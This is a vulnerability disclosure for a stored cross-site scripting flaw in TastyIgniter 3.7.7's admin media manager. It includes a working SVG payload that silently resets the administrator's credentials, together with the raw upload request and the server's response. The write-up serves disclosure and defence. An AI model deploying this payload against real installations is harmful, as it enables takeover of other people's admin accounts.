# CVE-2025-61417 â€” Stored XSS (Cross-Site Scripting)

---

**Vulnerability Type:** Cross-Site Scripting (XSS)  
**Vendor of Product:** [Tastyigniter](https://github.com/tastyigniter)   
**Affected Product:** TastyIgniter - 3.7.7  
**Attack Type:** Remote  
**Affected Component:** `admin/media_manager` feature built into the application (upload image).  
**Severity:** ??  
**Disclosure status:** Public  
**Impact:** Exploitation can lead to full administrative account takeover (modify admin username, email, password).

---

## Description

A stored cross-site scripting (XSS) vulnerability exists in TastyIgniter 3.7.7, affecting the `/admin/media_manager` component. Attackers who can upload files may craft a malicious SVG file containing JavaScript. When an administrator previews the SVG in the admin interface, the embedded script executes within the admin's browser context. This allows the attacker to modify the admin account credentials, enabling full account takeover.

---

## Steps to Reproduce

1. Go to `http://127.0.0.1:8000/admin/media_manager` and upload a crafted `.svg` file containing a malicious script.
   
   Example SVG Payload:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg">
     <script><![CDATA[
       fetch("http://127.0.0.1:8000/admin/staffs/account?_method=PATCH&Staff%5Bstaff_name%5D=Hacked&Staff%5Bstaff_email%5D=hacked%40gmail.com&Staff%5Buser%5D%5Busername%5D=Hacked&Staff%5Blanguage_id%5D=1&Staff%5Buser%5D%5Bpassword%5D=123456&Staff%5Buser%5D%5Bpassword_confirm%5D=123456", {
         method: "GET",
         credentials: "include",
         headers: {
           "X-Requested-With": "XMLHttpRequest",
           "X-IGNITER-REQUEST-HANDLER": "onSave"
         }
       });
     ]]></script>
   </svg>

2. Once the malicious SVG is uploaded, an admin browses to the Media Manager and previews the file. The embedded JavaScript executes in the admin's browser context.
3. The script sends an authenticated `PATCH` request (with valid headers like `X-Requested-With` and `X-IGNITER-REQUEST-HANDLER`) to `/admin/staffs/account`, modifying the admin's username, email, name, and password.
4. This results in a full account hijack of the administrator without their knowledge.


## HTTP Request (To Upload the Malicious SVG)
```
POST /admin/media_manager HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: KS9zbdPKPBt6IZIdC9rGqRwi8dYyy5AovnQ3B0oQ
X-IGNITER-FILEUPLOAD: mediamanager
Content-Type: multipart/form-data; boundary=----geckoformboundary572b120aaa61d256c4b644dd4c854b1a
Content-Length: 723
Origin: http://127.0.0.1:8000
Connection: keep-alive
Referer: http://127.0.0.1:8000/admin/media_manager
Cookie: <Cookie>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

------geckoformboundary572b120aaa61d256c4b644dd4c854b1a
Content-Disposition: form-data; name="path"
/ 
------geckoformboundary572b120aaa61d256c4b644dd4c854b1a
Content-Disposition: form-data; name="file_data"; filename="CSRF.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    fetch("http://127.0.0.1:8000/admin/staffs/account?_method=PATCH&Staff%5Bstaff_name%5D=HackedStaff&Staff%5Bstaff_email%5D=hacked%40gmail.com&Staff%5Buser%5D%5Busername%5D=HackedStaff&Staff%5Blanguage_id%5D=1&Staff%5Buser%5D%5Bpassword%5D=123456&Staff%5Buser%5D%5Bpassword_confirm%5D=123456", {
      method: "GET",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        "X-IGNITER-REQUEST-HANDLER": "onSave"
      }
    });
  ]]></script>
</svg>
------geckoformboundary572b120aaa61d256c4b644dd4c854b1a--

```

## HTTP Response (On Successful Upload)
```
HTTP/1.0 200 OK
Host: 127.0.0.1:8000
Date: Wed, 16 Jul 2025 08:10:42 GMT
Connection: close
X-Powered-By: PHP/8.0.30
Cache-Control: no-cache, private
Content-Type: application/json

{
  "link": "\/\/CSRF.svg",
  "result": "success"
}

```


